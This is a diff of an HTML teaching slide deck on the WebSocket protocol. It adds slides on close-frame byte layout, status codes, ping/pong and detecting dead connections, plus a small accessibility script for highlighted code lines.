+<section id="close-frame-structure" class="level2">
+<h2 class="anchored" data-anchor-id="close-frame-structure">Close Frame Structure</h2>
+<p>A server (no mask) closing normally (status code 1000, no reason): <code>0x88 0x02 0x03 0xE8</code></p>
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th>Byte</th>
+<th>Bits</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>0</td>
+<td><code>10001000</code></td>
+<td>FIN = 1, RSV = 000, opcode = 1000 (close)</td>
+</tr>
+<tr class="even">
+<td>1</td>
+<td><code>00000010</code></td>
+<td>MASK = 0, payload length = 2</td>
+</tr>
+<tr class="odd">
+<td>2-3</td>
+<td><code>00000011 11101000</code></td>
+<td>Status code <code>0x03E8</code> = 1000 (big-endian)</td>
+</tr>
+<tr class="even">
+<td>4+</td>
+<td></td>
+<td>Optional reason in UTF-8 (none here)</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="reading-a-close-frame" class="level2">
+<h2 class="anchored" data-anchor-id="reading-a-close-frame">Reading a Close Frame</h2>
+<ul>
+<li>The status code is the first 2 bytes of the payload
+<ul>
+<li><code>code := binary.BigEndian.Uint16(payload[0:2])</code></li>
+</ul></li>
+<li>Close frames from the client are masked like any other frame
+<ul>
+<li>Unmask the payload before reading the code</li>
+</ul></li>
+<li>The payload may be empty, with no status code at all
+<ul>
+<li>Check the length before reading 2 bytes</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
 </section>
-<section id="sending-frames-3" class="level2">
-<h2 class="anchored" data-anchor-id="sending-frames-3">Sending Frames</h2>
+<section id="ping-and-pong" class="level2">
+<h2 class="anchored" data-anchor-id="ping-and-pong">Ping and Pong</h2>
 <ul>
-<li>Check the length of your payload to determine how many bits are needed for the length</li>
-<li>Follow the same format for payload length as the received messages</li>
+<li>Ping (1001): "Are you still there?"</li>
+<li>Pong (1010): "Yes"
+<ul>
+<li>Must contain the same payload as the ping it answers</li>
+</ul></li>
+<li>Browsers answer pings automatically
+<ul>
+<li>JavaScript never sees them, and can't send them</li>
+</ul></li>
+<li>Servers send pings to check on their clients</li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
 </section>
-<section id="sending-frames-4" class="level2">
-<h2 class="anchored" data-anchor-id="sending-frames-4">Sending Frames</h2>
+<section id="why-ping" class="level2">
+<h2 class="anchored" data-anchor-id="why-ping">Why Ping?</h2>
 <ul>
-<li>MASK bit is 0 and there are not mask bytes
+<li>A browser sends a close frame when a tab closes normally</li>
+<li>Laptop lid closed, Wi-Fi drops, phone goes into a tunnel: <span class="yellow">nothing is sent</span>
 <ul>
-<li>After payload length, immediately add the bytes of the payload</li>
+<li>No close frame. The connection looks open forever</li>
+<li>Your server can't tell a quiet connection from a dead one</li>
+</ul></li>
+<li>Ping regularly
+<ul>
+<li>If you don't see a pong in return, the connection is dead</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
 
 
+</section>
+<section id="further-reading" class="level2">
+<h2 class="anchored" data-anchor-id="further-reading">Further Reading</h2>
+<ul>
+<li><a href="https://www.rfc-editor.org/info/rfc6455/#section-5">RFC 6455 Section 5 - WebSocket Frames</a></li>
+</ul>
+</section>
 </section>
 
 </main> <!-- /main -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  document.querySelectorAll("div.sourceCode[data-highlight-lines]").forEach(function (block) {
+    var lines = block.querySelectorAll("pre > code > span");
+    var spoken = [];
+    var count = 0;
+
+    block.getAttribute("data-highlight-lines").split(/[,|]/).forEach(function (range) {
+      var bounds = range.split("-");
+      var first = parseInt(bounds[0], 10);
+      var last = Math.min(parseInt(bounds[bounds.length - 1], 10), lines.length);
+      if (isNaN(first) || isNaN(last) || first > last) {
+        return;
+      }
+      for (var n = first; n <= last; n++) {
+        lines[n - 1].classList.add("highlight-line");
+        count++;
+      }
+      spoken.push(first === last ? String(first) : first + " to " + last);
+    });
+
+    // Screen readers get the highlighted line numbers, since the highlight itself is visual
+    if (count > 0) {
+      var note = document.createElement("p");
+      note.className = "visually-hidden";
+      note.textContent = (count === 1 ? "Highlighted line " : "Highlighted lines ") + spoken.join(", ");
+      block.insertBefore(note, block.firstChild);
+    }
+  });
+});
+</script>
 <script id="quarto-html-after-body" type="application/javascript">
   window.document.addEventListener("DOMContentLoaded", function (event) {
     const icon = "";
